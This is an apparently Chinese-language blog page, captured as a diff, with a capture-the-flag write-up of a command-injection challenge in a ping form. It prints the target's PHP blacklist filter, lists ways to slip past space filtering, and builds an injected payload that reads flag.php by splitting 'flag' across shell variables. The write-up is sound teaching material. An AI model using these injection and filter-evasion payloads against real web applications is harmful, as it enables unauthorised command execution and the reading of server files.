@@ -1,0 +1,452 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN">
+
+<head>
+    <link rel="preconnect" href="http://cdn.wutongliran.top/" crossorigin />
+    <link href="http://cdn.wutongliran.top/fonts/result.css" rel="stylesheet" />
+    <link rel="preload" as="font" type="font/woff2" href="http://cdn.wutongliran.top/fonts/Lyrio.woff2" crossorigin>
+
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="robots" content="noodp" />
+    <title>[GXYCTF2019]Ping Ping Ping - 梧桐漓染的博客</title><meta name="Description" content="桐漓的博客"><meta property="og:title" content="[GXYCTF2019]Ping Ping Ping" />
+<meta property="og:description" content="[GXYCTF2019]Ping Ping Ping初次访问： 根据页面的提示/?ip=以及题目Ping Ping Ping可以猜测PING的IP可以通过GET型给参数ip传参 尝试输入?ip=" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="/gxyctf2019ping-ping-ping/" /><meta property="og:image" content="/logo.png"/><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2023-10-22T21:53:00+08:00" />
+<meta property="article:modified_time" content="2023-10-22T21:53:00+08:00" /><meta property="og:site_name" content="Lyrio&#39;s blog" />
+<meta name="twitter:card" content="summary_large_image"/>
+<meta name="twitter:image" content="/logo.png"/>
+
+<meta name="twitter:title" content="[GXYCTF2019]Ping Ping Ping"/>
+<meta name="twitter:description" content="[GXYCTF2019]Ping Ping Ping初次访问： 根据页面的提示/?ip=以及题目Ping Ping Ping可以猜测PING的IP可以通过GET型给参数ip传参 尝试输入?ip="/>
+<meta name="application-name" content="Lyrio&#39;s blog">
+<meta name="apple-mobile-web-app-title" content="Lyrio&#39;s blog">
+
+<meta name="theme-color" content="#f8f8f8"><meta name="msapplication-TileColor" content="#da532c"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
+        <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+        <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="manifest" href="/site.webmanifest"><link rel="canonical" href="/gxyctf2019ping-ping-ping/" /><link rel="prev" href="/actf2020-%E6%96%B0%E7%94%9F%E8%B5%9Bexec/" /><link rel="next" href="/%E5%BC%BA%E7%BD%91%E6%9D%AF-2019%E9%9A%8F%E4%BE%BF%E6%B3%A8/" /><link rel="stylesheet" href="http://cdn.wutongliran.top/lib/normalize/normalize.min.css"><link rel="stylesheet" href="/css/color.css"><link rel="stylesheet" href="/css/style.min.css"><link rel="preload" as="style" onload="this.onload=null;this.rel='stylesheet'" href="http://cdn.wutongliran.top/lib/fontawesome-free/all.min.css">
+        <noscript><link rel="stylesheet" href="http://cdn.wutongliran.top/lib/fontawesome-free/all.min.css"></noscript><link rel="preload" as="style" onload="this.onload=null;this.rel='stylesheet'" href="http://cdn.wutongliran.top/lib/animate/animate.min.css">
+        <noscript><link rel="stylesheet" href="http://cdn.wutongliran.top/lib/animate/animate.min.css"></noscript>
+    
+    
+    
+    <script type="application/ld+json">
+    {
+        "@context": "http://schema.org",
+        "@type": "BlogPosting",
+        "headline": "[GXYCTF2019]Ping Ping Ping",
+        "inLanguage": "zh-CN",
+        "mainEntityOfPage": {
+            "@type": "WebPage",
+            "@id": "\/gxyctf2019ping-ping-ping\/"
+        },"genre": "posts","keywords": "CTF, RCE漏洞","wordcount":  1472 ,
+        "url": "\/gxyctf2019ping-ping-ping\/","datePublished": "2023-10-22T21:53:00+08:00","dateModified": "2023-10-22T21:53:00+08:00","publisher": {
+            "@type": "Organization",
+            "name": ""},"author": {
+                "@type": "Person",
+                "name": "Lyrio"
+            },"description": ""
+    }
+    </script><script src="//instant.page/5.1.1" defer type="module" integrity="sha384-MWfCL6g1OTGsbSwfuMHc8+8J2u71/LA8dzlIN3ycajckxuZZmF+DNjdm7O6H3PSq"></script>
+</head>
+
+<body header-desktop="fixed" header-mobile="auto"><script type="text/javascript">
+        function setTheme(theme) {document.body.setAttribute('theme', theme); document.documentElement.style.setProperty('color-scheme', theme === 'light' ? 'light' : 'dark'); window.theme = theme; }
+        function saveTheme(theme) {window.localStorage && localStorage.setItem('theme', theme);}
+        function getMeta(metaName) {const metas = document.getElementsByTagName('meta'); for (let i = 0; i < metas.length; i++) if (metas[i].getAttribute('name') === metaName) return metas[i]; return '';}
+        if (window.localStorage && localStorage.getItem('theme')) {let theme = localStorage.getItem('theme');theme === 'light' || theme === 'dark' || theme === 'black' ? setTheme(theme) : (window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches ? setTheme('dark') : setTheme('light')); } else { if ('light' === 'light' || 'light' === 'dark' || 'light' === 'black') setTheme('light'), saveTheme('light'); else saveTheme('auto'), window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches ? setTheme('dark') : setTheme('light');}
+        let metaColors = {'light': '#f8f8f8','dark': '#252627','black': '#000000'}
+        getMeta('theme-color').content = metaColors[document.body.getAttribute('theme')];
+    </script>
+    <div id="back-to-top"></div>
+    <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
+    <div class="header-wrapper">
+        <div class="header-title">
+            <a href="/" title="梧桐漓染的博客"><img
+        class="logo"
+        loading="lazy"
+        src="https://pic.imgdb.cn/item/652539dcc458853aefb12f73.png"
+        srcset="https://pic.imgdb.cn/item/652539dcc458853aefb12f73.png, https://pic.imgdb.cn/item/652539dcc458853aefb12f73.png 1.5x, https://pic.imgdb.cn/item/652539dcc458853aefb12f73.png 2x"
+        sizes="auto"
+        alt="https://pic.imgdb.cn/item/652539dcc458853aefb12f73.png"
+        title="https://pic.imgdb.cn/item/652539dcc458853aefb12f73.png" ></a>
+        </div>
+        <div class="menu">
+            <div class="menu-inner"><a class="menu-item" href="/posts/"><i class='fa fa-book'></i> 文章 </a><a class="menu-item" href="/categories/"><i class='fa fa-tasks'></i> 分类 </a><a class="menu-item" href="/tags/"><i class='fa fa-bookmark'></i> 标签 </a><a class="menu-item" href="/friends/"><i class='fas fa-fw fa-fan fa-spin'></i> 友链 </a><a class="menu-item" href="/about/"><i class='fas fa-spinner fa-pulse'></i> 关于 </a><span class="menu-item delimiter"></span><span class="menu-item search" id="search-desktop">
+                        <input type="text" placeholder="搜索文章标题或内容..." id="search-input-desktop">
+                        <a href="#" class="search-button search-toggle" id="search-toggle-desktop" title="搜索">
+                            <i class="fas fa-search fa-fw"></i>
+                        </a>
+                        <a href="#" class="search-button search-clear" id="search-clear-desktop" title="清空">
+                            <i class="fas fa-times-circle fa-fw"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-desktop">
+                            <i class="fas fa-spinner fa-fw fa-spin"></i>
+                        </span>
+                    </span><a href="#" class="menu-item theme-select" title="切换主题">
+                    <i class="fas fa-adjust fa-fw"></i>
+                    <select class="color-theme-select" id="theme-select-desktop" title="切换主题">
+                        <option value="light">浅色</option>
+                        <option value="dark">深色</option>
+                        <option value="black">黑色</option>
+                        <option value="auto">跟随系统</option>
+                    </select>
+                </a></div>
+        </div>
+    </div>
+</header><header class="mobile" id="header-mobile">
+    <div class="header-container">
+        <div class="header-wrapper">
+            <div class="header-title">
+                <a href="/" title="梧桐漓染的博客"><img
+        class="logo"
+        loading="lazy"
+        src="https://pic.imgdb.cn/item/652539dcc458853aefb12f73.png"
+        srcset="https://pic.imgdb.cn/item/652539dcc458853aefb12f73.png, https://pic.imgdb.cn/item/652539dcc458853aefb12f73.png 1.5x, https://pic.imgdb.cn/item/652539dcc458853aefb12f73.png 2x"
+        sizes="auto"
+        alt="https://pic.imgdb.cn/item/652539dcc458853aefb12f73.png"
+        title="https://pic.imgdb.cn/item/652539dcc458853aefb12f73.png" ></a>
+            </div>
+            <div class="menu-toggle" id="menu-toggle-mobile">
+                <span></span><span></span><span></span>
+            </div>
+        </div>
+        <div class="menu" id="menu-mobile"><div class="search-wrapper">
+                    <div class="search mobile" id="search-mobile">
+                        <input type="text" placeholder="搜索文章标题或内容..." id="search-input-mobile">
+                        <a href="#" class="search-button search-toggle" id="search-toggle-mobile" title="搜索">
+                            <i class="fas fa-search fa-fw"></i>
+                        </a>
+                        <a href="#" class="search-button search-clear" id="search-clear-mobile" title="清空">
+                            <i class="fas fa-times-circle fa-fw"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-mobile">
+                            <i class="fas fa-spinner fa-fw fa-spin"></i>
+                        </span>
+                    </div>
+                    <a href="#" class="search-cancel" id="search-cancel-mobile">
+                        取消
+                    </a>
+                </div><a class="menu-item" href="/posts/" title=""><i class='fa fa-book'></i>文章</a><a class="menu-item" href="/categories/" title=""><i class='fa fa-tasks'></i>分类</a><a class="menu-item" href="/tags/" title=""><i class='fa fa-bookmark'></i>标签</a><a class="menu-item" href="/friends/" title=""><i class='fas fa-fw fa-fan fa-spin'></i>友链</a><a class="menu-item" href="/about/" title=""><i class='fas fa-spinner fa-pulse'></i>关于</a><a href="#" class="menu-item theme-select" title="切换主题">
+                <i class="fas fa-adjust fa-fw"></i>
+                <select class="color-theme-select" id="theme-select-mobile" title="切换主题">
+                    <option value="light">浅色</option>
+                    <option value="dark">深色</option>
+                    <option value="black">黑色</option>
+                    <option value="auto">跟随系统</option>
+                </select>
+            </a></div>
+    </div>
+</header>
+<div class="search-dropdown desktop">
+    <div id="search-dropdown-desktop"></div>
+</div>
+<div class="search-dropdown mobile">
+    <div id="search-dropdown-mobile"></div>
+</div>
+<main class="main">
+            <div class="container"><div class="toc" id="toc-auto">
+        <h2 class="toc-title">目录</h2>
+        <div class="toc-content always-active" id="toc-content-auto"><nav id="TableOfContents"></nav></div>
+    </div><script>document.getElementsByTagName("main")[0].setAttribute("autoTOC", "true")</script><article class="page single"><h1 class="single-title animate__animated animate__flipInX">[GXYCTF2019]Ping Ping Ping</h1><div class="post-meta">
+            <div class="post-meta-line">
+                <span class="post-author"><i class="author fas fa-user-circle fa-fw"></i><a href="/" title="Author" rel=" author" class="author">Lyrio</a>
+                </span>&nbsp;<span class="post-category">收录于 </span>&nbsp;<span class="post-category">类别 <a href="/categories/ctf-writeup/"><i class="far fa-folder fa-fw"></i>CTF-WriteUp</a></span></div>
+            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw"></i>&nbsp;<time datetime="2023-10-22">2023-10-22</time>&nbsp;<i class="far fa-edit fa-fw"></i>&nbsp;<time datetime="2023-10-22">2023-10-22</time>&nbsp;<i class="fas fa-pencil-alt fa-fw"></i>&nbsp;约 1472 字&nbsp;
+                <i class="far fa-clock fa-fw"></i>&nbsp;预计阅读 3 分钟&nbsp;<span id="/gxyctf2019ping-ping-ping/" class="leancloud_visitors" data-flag-title="[GXYCTF2019]Ping Ping Ping">
+                        <i class="far fa-eye fa-fw"></i>&nbsp;<span class="leancloud-visitors-count waline-pageview-count" data-path="/gxyctf2019ping-ping-ping/"></span>&nbsp;次阅读
+                    </span>&nbsp;<span id="/gxyctf2019ping-ping-ping/" class="comment_count" data-flag-title="[GXYCTF2019]Ping Ping Ping">
+                        <i class="far fa-comments fa-fw"></i>&nbsp;<span class="waline-comment-count" id="waline-comment-count" data-path="/gxyctf2019ping-ping-ping/"></span>&nbsp;条评论
+                    </span>&nbsp;</div>
+        </div><div class="details toc" id="toc-static"  kept="">
+                <div class="details-summary toc-title">
+                    <span>目录</span>
+                    <span><i class="details-icon fas fa-angle-right"></i></span>
+                </div>
+                <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents"></nav></div>
+            </div><div class="content" id="content"><h1 id="gxyctf2019ping-ping-ping" class="headerLink">
+    <a href="#gxyctf2019ping-ping-ping" class="header-mark"></a>[GXYCTF2019]Ping Ping Ping</h1><p>初次访问：</p>
+<p><figure><a class="lightgallery" href="https://pic.imgdb.cn/item/65352989c458853aefc5a61d.jpg" title="[GXYCTF2019]Ping Ping Ping-1" data-thumbnail="https://pic.imgdb.cn/item/65352989c458853aefc5a61d.jpg">
+        <img
+            
+            loading="lazy"
+            src="https://pic.imgdb.cn/item/65352989c458853aefc5a61d.jpg"
+            srcset="https://pic.imgdb.cn/item/65352989c458853aefc5a61d.jpg, https://pic.imgdb.cn/item/65352989c458853aefc5a61d.jpg 1.5x, https://pic.imgdb.cn/item/65352989c458853aefc5a61d.jpg 2x"
+            sizes="auto"
+            alt="https://pic.imgdb.cn/item/65352989c458853aefc5a61d.jpg">
+    </a></figure></p>
+<p>根据页面的提示<code>/?ip=</code>以及题目<code>Ping Ping Ping</code>可以猜测PING的IP可以通过GET型给参数<code>ip</code>传参</p>
+<p>尝试输入<code>?ip=8.8.8.8</code>，页面回显<code>ping 8.8.8.8</code>的内容，说明猜测是正确的</p>
+<p><figure><a class="lightgallery" href="https://pic.imgdb.cn/item/65352a5dc458853aefc8eab9.jpg" title="[GXYCTF2019]Ping Ping Ping-2" data-thumbnail="https://pic.imgdb.cn/item/65352a5dc458853aefc8eab9.jpg">
+        <img
+            
+            loading="lazy"
+            src="https://pic.imgdb.cn/item/65352a5dc458853aefc8eab9.jpg"
+            srcset="https://pic.imgdb.cn/item/65352a5dc458853aefc8eab9.jpg, https://pic.imgdb.cn/item/65352a5dc458853aefc8eab9.jpg 1.5x, https://pic.imgdb.cn/item/65352a5dc458853aefc8eab9.jpg 2x"
+            sizes="auto"
+            alt="https://pic.imgdb.cn/item/65352a5dc458853aefc8eab9.jpg">
+    </a></figure></p>
+<p>试试是否存在RCE漏洞，输入<code>?ip=8.8.8.8;ls</code>，发现执行了<code>ls</code>，说明存在RCE漏洞</p>
+<p><figure><a class="lightgallery" href="https://pic.imgdb.cn/item/65352b3fc458853aefcce23e.jpg" title="[GXYCTF2019]Ping Ping Ping-3" data-thumbnail="https://pic.imgdb.cn/item/65352b3fc458853aefcce23e.jpg">
+        <img
+            
+            loading="lazy"
+            src="https://pic.imgdb.cn/item/65352b3fc458853aefcce23e.jpg"
+            srcset="https://pic.imgdb.cn/item/65352b3fc458853aefcce23e.jpg, https://pic.imgdb.cn/item/65352b3fc458853aefcce23e.jpg 1.5x, https://pic.imgdb.cn/item/65352b3fc458853aefcce23e.jpg 2x"
+            sizes="auto"
+            alt="https://pic.imgdb.cn/item/65352b3fc458853aefcce23e.jpg">
+    </a></figure></p>
+<p>想查看<code>flag.php</code>里的内容，输入<code>?ip=8.8.8.8;cat flag.php</code>，并没有得到预期的结果，发现其存在过滤机制，具体是什么机制还是未知，目前已知过滤空格</p>
+<p><figure><a class="lightgallery" href="https://pic.imgdb.cn/item/65352d2ac458853aefd49338.jpg" title="[GXYCTF2019]Ping Ping Ping-4" data-thumbnail="https://pic.imgdb.cn/item/65352d2ac458853aefd49338.jpg">
+        <img
+            
+            loading="lazy"
+            src="https://pic.imgdb.cn/item/65352d2ac458853aefd49338.jpg"
+            srcset="https://pic.imgdb.cn/item/65352d2ac458853aefd49338.jpg, https://pic.imgdb.cn/item/65352d2ac458853aefd49338.jpg 1.5x, https://pic.imgdb.cn/item/65352d2ac458853aefd49338.jpg 2x"
+            sizes="auto"
+            alt="https://pic.imgdb.cn/item/65352d2ac458853aefd49338.jpg">
+    </a></figure></p>
+<blockquote>
+<p><strong>空格的替代方式</strong></p>
+<ul>
+<li><code>$IFS$9</code>=&gt;<code>cat$IFS$9flag.php</code></li>
+<li><code>${ IFS}</code>=&gt;<code>cat${ IFS}flag.php</code></li>
+<li><code>${IFS}</code>=&gt;<code>cat${IFS}flag.php</code></li>
+<li><code>%09</code>=&gt;<code>cat%09flag.php</code></li>
+<li><code>&lt;</code>=&gt;<code>cat&gt;flag.php</code></li>
+<li><code>&gt;</code>=&gt;<code>cat&lt;flag.php</code></li>
+<li><code>&lt;&gt;</code>=&gt;<code>cat&lt;&gt;flag.php</code></li>
+<li><code>{,}</code>=&gt;<code>{cat,flag.php}</code></li>
+<li><code>%20</code>(URL编码)</li>
+</ul>
+</blockquote>
+<p>想办法绕过空格过滤，绕过空格过滤的方法有很多，一个个试，输入<code>?ip=8.8.8.8;cat${IFS}flag.php</code>，发现不是提示space而是symbol，说明除了空格还过滤了其他的符号</p>
+<p><figure><a class="lightgallery" href="https://pic.imgdb.cn/item/653531a8c458853aefe771a7.jpg" title="[GXYCTF2019]Ping Ping Ping-5" data-thumbnail="https://pic.imgdb.cn/item/653531a8c458853aefe771a7.jpg">
+        <img
+            
+            loading="lazy"
+            src="https://pic.imgdb.cn/item/653531a8c458853aefe771a7.jpg"
+            srcset="https://pic.imgdb.cn/item/653531a8c458853aefe771a7.jpg, https://pic.imgdb.cn/item/653531a8c458853aefe771a7.jpg 1.5x, https://pic.imgdb.cn/item/653531a8c458853aefe771a7.jpg 2x"
+            sizes="auto"
+            alt="https://pic.imgdb.cn/item/653531a8c458853aefe771a7.jpg">
+    </a></figure></p>
+<p>直到输入<code>?ip=8.8.8.8;cat$IFS$9flag.php</code>，发现不提示space、symbol，而是flag，说明连flag都过滤了</p>
+<p><figure><a class="lightgallery" href="https://pic.imgdb.cn/item/653532d3c458853aefec5501.jpg" title="[GXYCTF2019]Ping Ping Ping-6" data-thumbnail="https://pic.imgdb.cn/item/653532d3c458853aefec5501.jpg">
+        <img
+            
+            loading="lazy"
+            src="https://pic.imgdb.cn/item/653532d3c458853aefec5501.jpg"
+            srcset="https://pic.imgdb.cn/item/653532d3c458853aefec5501.jpg, https://pic.imgdb.cn/item/653532d3c458853aefec5501.jpg 1.5x, https://pic.imgdb.cn/item/653532d3c458853aefec5501.jpg 2x"
+            sizes="auto"
+            alt="https://pic.imgdb.cn/item/653532d3c458853aefec5501.jpg">
+    </a></figure></p>
+<p>这时候就该蒙圈了，由于几乎不清楚过滤机制的逻辑，稳妥做法是先绕过空格过滤，然后查看<code>index.php</code>的源码</p>
+<p>输入<code>?ip=8.8.8.8;cat$IFS$9index.php</code>，查看到<code>index,php</code>里的源码</p>
+<p><figure><a class="lightgallery" href="https://pic.imgdb.cn/item/653533ddc458853aeff0b53f.jpg" title="[GXYCTF2019]Ping Ping Ping-7" data-thumbnail="https://pic.imgdb.cn/item/653533ddc458853aeff0b53f.jpg">
+        <img
+            
+            loading="lazy"
+            src="https://pic.imgdb.cn/item/653533ddc458853aeff0b53f.jpg"
+            srcset="https://pic.imgdb.cn/item/653533ddc458853aeff0b53f.jpg, https://pic.imgdb.cn/item/653533ddc458853aeff0b53f.jpg 1.5x, https://pic.imgdb.cn/item/653533ddc458853aeff0b53f.jpg 2x"
+            sizes="auto"
+            alt="https://pic.imgdb.cn/item/653533ddc458853aeff0b53f.jpg">
+    </a></figure></p>
+<p>但怎么觉得这源码好像缺斤少两的，通过查看网页源代码获取到完整源码</p>
+<p><figure><a class="lightgallery" href="https://pic.imgdb.cn/item/6535345dc458853aeff29094.jpg" title="[GXYCTF2019]Ping Ping Ping-8" data-thumbnail="https://pic.imgdb.cn/item/6535345dc458853aeff29094.jpg">
+        <img
+            
+            loading="lazy"
+            src="https://pic.imgdb.cn/item/6535345dc458853aeff29094.jpg"
+            srcset="https://pic.imgdb.cn/item/6535345dc458853aeff29094.jpg, https://pic.imgdb.cn/item/6535345dc458853aeff29094.jpg 1.5x, https://pic.imgdb.cn/item/6535345dc458853aeff29094.jpg 2x"
+            sizes="auto"
+            alt="https://pic.imgdb.cn/item/6535345dc458853aeff29094.jpg">
+    </a></figure></p>
+<p>重点看涉及到过滤机制的代码：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nx">preg_match</span><span class="p">(</span><span class="s2">&#34;/\&amp;|\/|\?|\*|\&lt;|[\x{00}-\x{1f}]|\&gt;|\&#39;|</span><span class="se">\&#34;</span><span class="s2">|</span><span class="se">\\</span><span class="s2">|\(|\)|\[|\]|\{|\}/&#34;</span><span class="p">,</span> <span class="nv">$ip</span><span class="p">,</span> <span class="nv">$match</span><span class="p">)){</span>
+</span></span><span class="line"><span class="cl">    <span class="k">echo</span> <span class="nx">preg_match</span><span class="p">(</span><span class="s2">&#34;/\&amp;|\/|\?|\*|\&lt;|[\x{00}-\x{20}]|\&gt;|\&#39;|</span><span class="se">\&#34;</span><span class="s2">|</span><span class="se">\\</span><span class="s2">|\(|\)|\[|\]|\{|\}/&#34;</span><span class="p">,</span> <span class="nv">$ip</span><span class="p">,</span> <span class="nv">$match</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="k">die</span><span class="p">(</span><span class="s2">&#34;fxck your symbol!&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="p">}</span> <span class="k">else</span> <span class="k">if</span><span class="p">(</span><span class="nx">preg_match</span><span class="p">(</span><span class="s2">&#34;/ /&#34;</span><span class="p">,</span> <span class="nv">$ip</span><span class="p">)){</span>
+</span></span><span class="line"><span class="cl">    <span class="k">die</span><span class="p">(</span><span class="s2">&#34;fxck your space!&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="p">}</span> <span class="k">else</span> <span class="k">if</span><span class="p">(</span><span class="nx">preg_match</span><span class="p">(</span><span class="s2">&#34;/bash/&#34;</span><span class="p">,</span> <span class="nv">$ip</span><span class="p">)){</span>
+</span></span><span class="line"><span class="cl">    <span class="k">die</span><span class="p">(</span><span class="s2">&#34;fxck your bash!&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="p">}</span> <span class="k">else</span> <span class="k">if</span><span class="p">(</span><span class="nx">preg_match</span><span class="p">(</span><span class="s2">&#34;/.*f.*l.*a.*g.*/&#34;</span><span class="p">,</span> <span class="nv">$ip</span><span class="p">)){</span>
+</span></span><span class="line"><span class="cl">    <span class="k">die</span><span class="p">(</span><span class="s2">&#34;fxck your flag!&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="p">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>先看第一个判断：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nx">preg_match</span><span class="p">(</span><span class="s2">&#34;/\&amp;|\/|\?|\*|\&lt;|[\x{00}-\x{1f}]|\&gt;|\&#39;|</span><span class="se">\&#34;</span><span class="s2">|</span><span class="se">\\</span><span class="s2">|\(|\)|\[|\]|\{|\}/&#34;</span><span class="p">,</span> <span class="nv">$ip</span><span class="p">,</span> <span class="nv">$match</span><span class="p">)){</span>
+</span></span><span class="line"><span class="cl">    <span class="k">echo</span> <span class="nx">preg_match</span><span class="p">(</span><span class="s2">&#34;/\&amp;|\/|\?|\*|\&lt;|[\x{00}-\x{20}]|\&gt;|\&#39;|</span><span class="se">\&#34;</span><span class="s2">|</span><span class="se">\\</span><span class="s2">|\(|\)|\[|\]|\{|\}/&#34;</span><span class="p">,</span> <span class="nv">$ip</span><span class="p">,</span> <span class="nv">$match</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="k">die</span><span class="p">(</span><span class="s2">&#34;fxck your symbol!&#34;</span><span class="p">);</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><code>preg_match()</code>是一个通过正则来匹配字符串的函数，匹配成功返回1、失败返回0，即true or false</p>
+<p>格式大致为<code>preg_match([&quot;/正则规则/&quot;],[&quot;接受匹配的字符串&quot;],[用于存储匹配结果的数组])</code></p>
+<p>(用于存储匹配结果的数组可有可无)</p>
+<p>可以这么理解，如果&quot;接受匹配的字符串&quot;符合&quot;/正则规则/&quot;，则返回个1，反之0</p>
+<p>再来看正则部分，正则规则被包含在两个<code>/</code>内</p>
+<p>正则的内容是：<code>\&amp;|\/|\?|\*|\&lt;|[\x{00}-\x{1f}]|\&gt;|\'|\&quot;|\\|\(|\)|\[|\]|\{|\}</code></p>
+<p><code>[\x{00}-\x{1f}]</code>的意思是将匹配字符串中包含 Unicode 编码范围从 00 到 1F 的所有字符。</p>
+<p>整条正则的意思是只要<code>$ip</code>里有<code>&amp;</code> <code>/</code> <code>?</code> <code>*</code> <code>&lt;</code> <code>&gt;</code> <code>'</code> <code>&quot;</code> <code>\</code> <code>(</code> <code>)</code> <code>[</code> <code>]</code> <code>{</code> <code>}</code> 以及 Unicode 编码范围从 00 到 1F 的所有字符如回车、换行等的字符就匹配成功</p>
+<p>再看第二个判断：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="k">else</span> <span class="k">if</span><span class="p">(</span><span class="nx">preg_match</span><span class="p">(</span><span class="s2">&#34;/ /&#34;</span><span class="p">,</span> <span class="nv">$ip</span><span class="p">)){</span>
+</span></span><span class="line"><span class="cl">    <span class="k">die</span><span class="p">(</span><span class="s2">&#34;fxck your space!&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="p">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>正则的内容是一个空格，意思是只要<code>$ip</code>里有空格就匹配成功</p>
+<p>再看第三个判断：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="k">else</span> <span class="k">if</span><span class="p">(</span><span class="nx">preg_match</span><span class="p">(</span><span class="s2">&#34;/bash/&#34;</span><span class="p">,</span> <span class="nv">$ip</span><span class="p">)){</span>
+</span></span><span class="line"><span class="cl">    <span class="k">die</span><span class="p">(</span><span class="s2">&#34;fxck your bash!&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="p">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>正则的内容是<code>bash</code>，意思是只要<code>$ip</code>里出现<code>bash</code>就匹配成功</p>
+<p>再看第四个判断：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="k">else</span> <span class="k">if</span><span class="p">(</span><span class="nx">preg_match</span><span class="p">(</span><span class="s2">&#34;/.*f.*l.*a.*g.*/&#34;</span><span class="p">,</span> <span class="nv">$ip</span><span class="p">)){</span>
+</span></span><span class="line"><span class="cl">    <span class="k">die</span><span class="p">(</span><span class="s2">&#34;fxck your flag!&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="p">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>正则的内容是<code>.*f.*l.*a.*g.*</code>，意思是只要<code>$ip</code>里依次出现<code>f</code> <code>l</code> <code>a</code> <code>g</code>就匹配成功，例如字符串：<code>1f2l3a4g5</code>就可以匹配成功</p>
+<p>知道了过滤机制接下来就要去绕过，原始payload是<code>?ip=8.8.8.8;cat flag.php</code>，需要绕过的有：空格、flag</p>
+<p>首先空格可以用<code>$IFS$9</code>代替</p>
+<p>由于<code>$</code>和<code>;</code>没有被过滤，所以可以用变量拼接来绕过正则<code>.*f.*l.*a.*g.*</code>，例如：<code>a=ag;b=fl</code>，这样<code>flag</code>就变成<code>$b$a</code></p>
+<p><strong>最终的payload是：<code>?ip=8.8.8.8;a=ag;b=fl;cat$IFS$9$b$a.php</code></strong></p>
+<p><figure><a class="lightgallery" href="https://pic.imgdb.cn/item/65353d62c458853aef1abc3d.jpg" title="[GXYCTF2019]Ping Ping Ping-9" data-thumbnail="https://pic.imgdb.cn/item/65353d62c458853aef1abc3d.jpg">
+        <img
+            
+            loading="lazy"
+            src="https://pic.imgdb.cn/item/65353d62c458853aef1abc3d.jpg"
+            srcset="https://pic.imgdb.cn/item/65353d62c458853aef1abc3d.jpg, https://pic.imgdb.cn/item/65353d62c458853aef1abc3d.jpg 1.5x, https://pic.imgdb.cn/item/65353d62c458853aef1abc3d.jpg 2x"
+            sizes="auto"
+            alt="https://pic.imgdb.cn/item/65353d62c458853aef1abc3d.jpg">
+    </a></figure></p>
+<p>查看页面源码，得到flag</p>
+<p><figure><a class="lightgallery" href="https://pic.imgdb.cn/item/65353dbdc458853aef1c3d28.jpg" title="[GXYCTF2019]Ping Ping Ping-10" data-thumbnail="https://pic.imgdb.cn/item/65353dbdc458853aef1c3d28.jpg">
+        <img
+            
+            loading="lazy"
+            src="https://pic.imgdb.cn/item/65353dbdc458853aef1c3d28.jpg"
+            srcset="https://pic.imgdb.cn/item/65353dbdc458853aef1c3d28.jpg, https://pic.imgdb.cn/item/65353dbdc458853aef1c3d28.jpg 1.5x, https://pic.imgdb.cn/item/65353dbdc458853aef1c3d28.jpg 2x"
+            sizes="auto"
